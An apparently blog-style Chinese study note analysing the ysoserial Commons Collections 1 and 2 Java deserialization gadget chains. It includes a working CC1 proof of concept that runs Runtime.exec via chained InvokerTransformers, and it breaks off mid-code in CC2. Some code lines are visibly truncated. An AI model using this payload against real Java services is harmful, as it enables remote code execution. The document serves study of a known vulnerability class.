# 前言
整理了一下之前的笔记，文中不对一些前置知识进行科普，如`javassist`、动态代理等，如果不了解的同学可以自行百度哈。
# 分析
## CommonsCollections1
ysoserial给出调用栈如下：
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
我们先从最底下调用`Runtime.exec`的地方开始，跟进`org.apache.commons.collections.functors.InvokerTransformer#transform`，可以看到有反射的调用，所以我们需要寻找对此方法调用的地方
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
跟进`org.apache.commons.collections.functors.ChainedTransformer#transform`此处的`iTransformers`我们可以在`ChainedTransformer`实例化的时候传进去，进而可以达到调用`org.apache.commons.collections.functors.InvokerTransformer#transform`的目的
    private final Transformer[] iTransformers;
    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }
    //省略部分代码
    public Object transform(Object object) {
        for (int i = 0; i  memberValues;
    public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            //省略部分代码
            switch(var7) {
            case 0:
                return this.toStringImpl();
            case 1:
                return this.hashCodeImpl();
            case 2:
                return this.type;
            default:
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }
                    return var6;
                }
            }
        }
    }
怎么样才能触发invoke方法呢，回到最初触发反序列化的地方`sun.reflect.annotation.AnnotationInvocationHandler#readObject`，可以看到`this.memberValues.entrySet().iterator()`，如果此处的`this.memberValues`是通过动态代理构建的，那么当`this.memberValues`进行方法调用时是使用代理类的invoke方法进行调用的，并且`sun.reflect.annotation.AnnotationInvocationHandler#readObject`实现`InvocationHandler`接口，所以整个攻击链就行形成了（不得不佩服作者的Java功底Orz）
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;
        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        //省略部分代码
    }
最终POC如下：
    package CommonsCollections;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollections1 {
        public static void main(String[] args) throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            Class cls=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);
            constructor.setAccessible(true);
            InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);
            Map map1=(Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler);
            Object object=constructor.newInstance(Override.class,map1);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("test.out")));
            objectOutputStream.writeObject(object);
            ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("test.out"));
            objectInputStream.readObject();
        }
    }
## CommonsCollections2
`ysoserial`的给出的调用链如下：
    Gadget chain:
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
跟进`java.util.PriorityQueue#readObject`，可以看到将对象读取之后，会调用`java.util.PriorityQueue#heapify`对堆进行调整，在`heapify`处打一个断点对`ysoserial`进行调试
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();
        // Read in (and discard) array length
        s.readInt();
        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];
        // Read in all elements.
        for (int i = 0; i >> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
跟进`java.util.PriorityQueue#siftDown`，如果`comparator`不为空则使用自定义的`comparator`对元素进行筛选
    private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
跟进`java.util.PriorityQueue#siftDownUsingComparator`，可以看到这里使用了`comparator.compare`进行比较，此处的`comparator.compare`为`org.apache.commons.collections4.comparators.TransformingComparator#compare`
    private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k  0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c)  transformer;
    public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
然后这里是通过`InvokerTransformer.transform`调用`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer`。
    public O transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
            }
        }
    }
跟进`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`的`newTransformer`方法，此处的`getTransletInstance`会获取我们传入的字节码的实例
    public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;
        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);
        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }
        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
跟进`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance`，此处的`_class`为空，会进入`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses`对`_class`进行一个赋值
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;
            if (_class == null) defineTransletClasses();
            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }
            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
跟进`defineTransletClasses`，可以看到循环那里将`_bytecodes（也就是我们构造的恶意字节码）`通过`Classloader`加载之后传给`_class`
    private void defineTransletClasses()
            throws TransformerConfigurationException {
            if (_bytecodes == null) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
                throw new TransformerConfigurationException(err.toString());
            }
            TransletClassLoader loader = (TransletClassLoader)
                AccessController.doPrivileged(new PrivilegedAction() {